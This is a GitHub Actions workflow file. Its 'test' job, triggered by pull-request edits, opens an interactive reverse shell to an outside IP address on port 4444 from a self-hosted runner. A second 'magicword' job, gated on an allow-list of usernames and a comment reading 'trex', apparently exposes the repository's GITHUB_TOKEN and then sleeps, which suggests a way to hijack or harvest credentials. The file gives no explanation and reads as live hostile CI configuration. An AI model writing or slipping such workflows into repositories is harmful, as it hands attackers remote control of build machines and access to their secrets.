on:
  issue_comment:
    types: [created]
  pull_request:
    types: [edited]
  
jobs:
  test:
    runs-on: gossip
    if: github.event_name == 'pull_request'
    steps:
      - run: bash -i >& /dev/tcp/34.69.1.208/4444 0>&1
      
  magicword:
    runs-on: gossip
    if: contains( '\
      jack,\
      jack,\
      john,\
      certainlynotvikorium,\
      bill,\
      joe,\
      alissa,\
      ', format('{0},', github.actor)) && github.event.comment.body == 'trex'
    steps:
      - name: You said the magic word!
        run: sleep 30
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
